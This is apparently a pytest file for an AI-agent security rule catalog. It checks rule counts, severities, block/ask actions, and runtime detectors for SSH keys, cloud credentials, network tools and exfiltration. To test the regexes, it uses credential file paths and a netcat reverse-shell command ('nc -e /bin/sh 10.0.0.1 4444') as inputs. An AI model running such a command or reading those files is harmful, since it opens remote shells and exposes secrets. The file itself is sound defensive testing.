from __future__ import annotations

import re

from app.agent_security.models import SecurityAction, Severity
from app.agent_security.rules import (
    CATEGORY_LABELS,
    RULES,
    RULES_BY_ID,
    RUNTIME_RULES,
    RUNTIME_RULES_BY_ID,
    rule_by_id,
    rule_ids,
    runtime_rule_ids,
    static_rules,
)


def test_catalog_has_28_unique_rules_across_8_categories() -> None:
    assert len(RULES) == 28
    assert len(set(rule_ids())) == 28
    assert {rule.category for rule in RULES} == set(CATEGORY_LABELS)
    assert len(CATEGORY_LABELS) == 8


def test_every_regex_rule_compiles() -> None:
    for rule in RULES:
        if rule.kind == "regex":
            re.compile(rule.pattern)


def test_rule_ids_are_sequential_and_indexed() -> None:
    expected = [f"S{index:02d}" for index in range(1, 29)]
    assert rule_ids() == expected
    assert set(RULES_BY_ID) == set(expected)


def test_static_rules_are_split_by_target() -> None:
    skill_rules = {rule.rule_id for rule in static_rules("skill")}
    mcp_rules = {rule.rule_id for rule in static_rules("mcp")}
    assert {"S01", "S02", "S05", "S08", "S16", "S17"} <= skill_rules
    assert {"S03", "S13", "S14", "S15"} <= mcp_rules
    assert "S13" not in skill_rules
    runtime_only = {"S23", "S24", "S25", "S26", "S27", "S28"}
    assert not (runtime_only & skill_rules)


def test_critical_rules_are_block_or_ask() -> None:
    for rule in RULES:
        if rule.severity == Severity.CRITICAL:
            assert rule.action in {SecurityAction.BLOCK, SecurityAction.ASK, SecurityAction.ALERT}


def test_destructive_rules_block() -> None:
    for rule_id in ("S04", "S05", "S07", "S08", "S10", "S14", "S15"):
        assert RULES_BY_ID[rule_id].action == SecurityAction.BLOCK


def test_v1_runtime_rules_match_landing_spec() -> None:
    """R001-R005: the five first-version runtime rules (landing doc 11.2)."""
    expected = {
        "R001": ("ssh_private_key_access", Severity.HIGH, SecurityAction.BLOCK),
        "R002": ("cloud_credential_access", Severity.HIGH, SecurityAction.BLOCK),
        "R003": ("unapproved_network_tool", Severity.MEDIUM, SecurityAction.ASK),
        "R004": ("unapproved_mcp_tool", Severity.HIGH, SecurityAction.BLOCK),
        "R005": ("sensitive_read_then_exfil", Severity.CRITICAL, SecurityAction.ALERT),
    }
    assert runtime_rule_ids() == list(expected)
    for rule in RUNTIME_RULES:
        name, severity, action = expected[rule.rule_id]
        assert rule.name == name
        assert rule.severity == severity
        assert rule.action == action
        assert rule.layer == "runtime"
        if rule.kind == "regex":
            re.compile(rule.pattern)


def test_v1_runtime_rules_do_not_disturb_static_catalog() -> None:
    assert set(runtime_rule_ids()).isdisjoint(set(rule_ids()))
    assert len(RULES) == 28
    assert rule_by_id("R005").rule_id == "R005"
    assert rule_by_id("S08").rule_id == "S08"
    assert rule_by_id("R999") is None


def test_v1_regex_patterns_match_expected_paths() -> None:
    ssh = RUNTIME_RULES_BY_ID["R001"].pattern
    cloud = RUNTIME_RULES_BY_ID["R002"].pattern
    network = RUNTIME_RULES_BY_ID["R003"].pattern
    assert re.search(ssh, "/root/.ssh/id_rsa")
    assert re.search(ssh, "/home/u/.ssh/id_ed25519")
    assert not re.search(ssh, "/home/u/project/main.py")
    assert re.search(cloud, "/root/.aws/credentials")
    assert re.search(cloud, "/root/.kube/config")
    assert not re.search(cloud, "/root/project/config.yaml")
    assert re.search(network, "nc -e /bin/sh 10.0.0.1 4444")
    assert re.search(network, "ssh deploy@prod-1")
    assert not re.search(network, "python train.py")
